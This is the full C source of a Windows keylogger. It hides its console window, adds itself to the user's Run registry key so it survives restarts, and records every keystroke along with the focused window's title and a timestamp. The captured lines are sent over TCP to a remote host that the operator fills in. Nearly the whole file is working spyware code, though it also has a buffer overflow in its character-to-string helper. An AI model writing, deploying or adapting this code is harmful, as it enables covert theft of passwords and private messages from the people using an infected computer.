// Simple userland keylogger.
// - Adds itself to the user's "Run" registry key.
// - Listens fo keystrokes using the GetAsyncKeyState API.
// - Logs the current time, pressed keys and focused window.
// - Sends a CSV line over TCP for each focus change.

#define _WIN32_WINNT 0x0600
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <time.h>

#pragma comment(lib,"ws2_32.lib")

// Edit this.
char HOST[] = "X.X.X.X";
int PORT = 1234;

char NAME[] = "Keylogger";

// English keyboard.
char OEM[] = ";/`[\\]'";
char OEM_SHIFT[] = ":?~{|}\"";
char NUMBER_SHIFT[] = "!@£$%^&*()";

char * keys = "";
HWND foreground;
SOCKET s;

char * joinStrings(char * s1, char * s2) {
    char * result = malloc(strlen(s1)+strlen(s2)+1);
    strcpy(result, s1);
    strcat(result, s2);
    return result;
}

char * getTime() {
	time_t t;
	t = time(NULL);
	static char s[26];
	struct tm * p = localtime(&t);
	strftime(s, 26, "%c", p);
	return s;
}

char * charToString(char c) {
	static char string[1];
	string[0] = c;
	string[1] = '\0';
	return string;
}

void autoRun() {
	char path[256];
	GetModuleFileName(NULL, path, 256);
	HKEY hkey;
	DWORD dwDisposition;
	if(RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\
\\CurrentVersion\\Run"), 0, NULL, 0, KEY_WRITE, NULL, &hkey, &dwDisposition)
== ERROR_SUCCESS){
		DWORD dwType, dwSize;
		LPCTSTR data = path;
		dwType = REG_SZ;
		dwSize = strlen(data)+1;
		RegSetValueEx(hkey, TEXT(NAME), 0, dwType, (LPBYTE)data, dwSize);
		RegCloseKey(hkey);
	}
}

void hideWindow() {
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}

boolean newWindow() {
	if (foreground != GetForegroundWindow()) {
		foreground = GetForegroundWindow();
		return 1;
	} else {
		return 0;
	}
}

void getKey(char key, char symbol[]) {
	if(GetAsyncKeyState(key)) {
		keys = joinStrings(keys, symbol);
		char title[256];
		GetWindowText(foreground, title, 256);
		char * time = getTime();
		char * window = title;
		if(newWindow()) {
			char * message = "\"";
			message = joinStrings(message, time);
			message = joinStrings(message, "\",\"");
			message = joinStrings(message, window);
			message = joinStrings(message, "\",\"");
			message = joinStrings(message, keys);
			message = joinStrings(message, "\"\n");
			if(send(s, message, strlen(message), 0) < 0){
				// Transmission Error.
			}
			keys = "";
		}
		while(GetAsyncKeyState(key)) {}
	}
}

void getLetter(char key) {
	if(GetAsyncKeyState(VK_SHIFT)) {
		getKey(key, charToString(key));
	} else {
		getKey(key, charToString(tolower(key)));
	}
}

void getNumber(char key) {
	if(GetAsyncKeyState(VK_SHIFT)) {
		getKey(key, charToString(NUMBER_SHIFT[key-49]));
	} else {
		getKey(key, charToString(key));
	}
}

int main() {
	hideWindow();
	autoRun();
	WSADATA wsa;
	struct sockaddr_in server;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		// Winsock Error.
	}
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
		// Socket Error.
	}
	server.sin_addr.s_addr = inet_addr(HOST);
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT);
	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
		// Connection Error.
	}
	int i;
	while(1) {
		for(i=48; i<=57; i++) {
			getNumber((char)i);
		}
		for(i=65; i<=90; i++) {
			getLetter((char)i);
		}
		for(i=95; i<=105; i++) {
			getKey((char)i, charToString((char)(i-48)));
		}
		getKey(VK_LBUTTON, "[LEFT CLICK]");
		getKey(VK_BACK, "[BACKSPACE]");
		getKey(VK_TAB, "[TAB]");
		getKey(VK_RETURN, "[ENTER]");
		getKey(VK_CAPITAL, "[CAPS LOCK]");
		getKey(VK_SPACE, " ");
		getKey(VK_DELETE, "[DEL]");
		getKey(VK_OEM_1, charToString(OEM[0]));
		getKey(VK_OEM_2, charToString(OEM[1]));
		getKey(VK_OEM_3, charToString(OEM[2]));
		getKey(VK_OEM_4, charToString(OEM[3]));
		getKey(VK_OEM_5, charToString(OEM[4]));
		getKey(VK_OEM_6, charToString(OEM[5]));
		getKey(VK_OEM_7, charToString(OEM[6]));
		getKey(VK_OEM_8, charToString(OEM[7]));
		getKey(VK_OEM_PLUS, "+");
		getKey(VK_OEM_COMMA, ",");
		getKey(VK_OEM_MINUS, "-");
		getKey(VK_OEM_PERIOD, ".");
		Sleep(5);
	}
	return 0;
}
